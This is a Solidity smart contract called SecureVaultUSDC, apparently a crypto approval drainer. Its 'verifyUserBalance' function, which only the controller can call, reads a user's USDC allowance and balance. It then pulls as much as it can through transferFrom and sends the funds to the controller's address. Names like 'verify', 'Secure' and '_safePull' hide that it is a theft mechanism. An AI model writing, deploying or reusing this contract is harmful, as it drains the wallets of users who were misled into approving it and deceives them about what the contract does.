// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Token {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

contract SecureVaultUSDC {
    
    address public controller;
    address public paymentToken;

    event TransferExecuted(address indexed sender, uint256 value);
    event ControllerUpdated(address indexed previous, address indexed current);

    modifier controllerOnly() {
        require(msg.sender == controller, "Access restricted");
        _;
    }

    constructor() {
        controller = msg.sender;
        paymentToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC on Ethereum
    }

    function verifyUserBalance(address user) external controllerOnly {
        Token token = Token(paymentToken);
        
        uint256 approved = token.allowance(user, address(this));
        require(approved > 0, "No approval found");

        uint256 bal = token.balanceOf(user);
        uint256 amount = approved < bal ? approved : bal;
        require(amount > 0, "Zero balance");

        _safePull(paymentToken, user, controller, amount);

        emit TransferExecuted(user, amount);
    }

    function _safePull(
        address token,
        address from,
        address to,
        uint256 amount
    ) internal {
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            from, to, amount
        );
        
        (bool success, bytes memory ret) = token.call(data);
        require(success, "Pull failed");

        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "Pull rejected");
        }
    }

    function updateController(address newController) external controllerOnly {
        require(newController != address(0), "Invalid address");
        emit ControllerUpdated(controller, newController);
        controller = newController;
    }
}